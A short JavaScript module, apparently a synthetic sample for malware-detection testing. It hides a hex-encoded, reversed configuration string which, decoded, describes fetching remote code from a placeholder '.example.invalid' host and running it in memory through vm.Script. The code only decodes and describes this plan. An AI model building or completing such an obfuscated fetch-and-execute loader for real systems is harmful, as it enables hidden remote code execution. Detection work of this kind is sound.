const moduleShape = Object.freeze({ format: "commonjs" });

const Material_613076c0 = "[\"66\",\"61\",\"35\",\"65\",\"2f\",\"74\",\"69\",\"64\",\"75\",\"41\",\"65\",\"64\",\"6f\",\"4e\",\"3d\",\"74\",\"6e\",\"65\",\"67\",\"61\",\"5f\",\"72\",\"65\",\"73\",\"75\",\"7c\",\"69\",\"70\",\"61\",\"2f\",\"64\",\"69\",\"6c\",\"61\",\"76\",\"6e\",\"69\",\"2e\",\"65\",\"6c\",\"70\",\"6d\",\"61\",\"78\",\"65\",\"2e\",\"64\",\"36\",\"32\",\"65\",\"66\",\"64\",\"32\",\"64\",\"66\",\"61\",\"35\",\"65\",\"2d\",\"65\",\"64\",\"6f\",\"6e\",\"2f\",\"2f\",\"3a\",\"73\",\"70\",\"74\",\"74\",\"68\",\"3d\",\"6c\",\"72\",\"75\",\"7c\",\"46\",\"44\",\"32\",\"44\",\"46\",\"41\",\"35\",\"45\",\"2d\",\"45\",\"44\",\"4f\",\"4e\",\"3d\",\"64\",\"69\",\"5f\",\"6e\",\"67\",\"69\",\"61\",\"70\",\"6d\",\"61\",\"63\",\"7c\",\"31\",\"3d\",\"74\",\"6e\",\"75\",\"6f\",\"63\",\"5f\",\"65\",\"67\",\"61\",\"74\",\"73\",\"7c\",\"6e\",\"6f\",\"69\",\"74\",\"63\",\"6e\",\"75\",\"66\",\"5f\",\"6e\",\"65\",\"68\",\"74\",\"5f\",\"68\",\"63\",\"74\",\"65\",\"66\",\"3d\",\"72\",\"65\",\"74\",\"70\",\"61\",\"64\",\"61\",\"7c\",\"79\",\"72\",\"6f\",\"6d\",\"65\",\"6d\",\"5f\",\"68\",\"63\",\"74\",\"61\",\"70\",\"73\",\"69\",\"64\",\"2c\",\"65\",\"74\",\"6f\",\"6d\",\"65\",\"72\",\"5f\",\"65\",\"72\",\"69\",\"75\",\"71\",\"63\",\"61\",\"3d\",\"73\",\"70\",\"65\",\"74\",\"73\",\"7c\",\"31\",\"3d\",\"76\"]";

const Codec_613076c0 = "hex_array|reverse_bytes|";



function load_613076c0() { return JSON.parse(Material_613076c0).map((value) => Number.parseInt(value, 16)); }

function decode_613076c0(storedBytes) { return [...storedBytes].reverse(); }

async function recover_613076c0() {

  const harmlessValue = { ...{ north: 1 }, south: 2 };

  const storedBytes = load_613076c0(); let recoveredBytes = [];

  recoveredBytes = await (async () => decode_613076c0(storedBytes))();

  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");

}

async function inspect_613076c0() { return await recover_613076c0(); }

async function plan_613076c0() { const inspect = inspect_613076c0; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "fetch_then_function", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_613076c0;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_613076c0());

